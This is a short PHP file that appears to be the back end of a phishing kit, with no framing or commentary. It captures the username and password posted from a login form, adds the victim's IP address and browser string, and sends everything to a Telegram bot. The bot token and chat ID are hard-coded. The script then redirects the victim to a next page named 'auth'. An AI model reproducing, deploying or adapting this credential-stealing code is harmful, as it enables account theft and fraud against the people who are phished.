<?php

$ctrl= getenv("REMOTE_ADDR");
$message .= "[+]━━━━━━━━━【🏨 Address INFO】━━━━━━━━━[+]\n";
$message .= "".$_POST['user']."\n";
$message .= "".$_POST['pass']."\n";
$message .= "[+]━━━━━━━━━━【🌐 IP INFO】━━━━━━━━━━[+]\n";
$message .= "[📶 IP] = https://whatismyipaddress.com/ip/$ctrl\n";
$message .= "[🌐 BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."\n";

  $botToken="1927922170:AAE4nUXkiDw74kng4DxVD9Qx_-0DwKlQ1h4";
  $website="https://api.telegram.org/bot".$botToken;
  $chatId="1228935793";
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
	  
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  
header("Location: auth");?>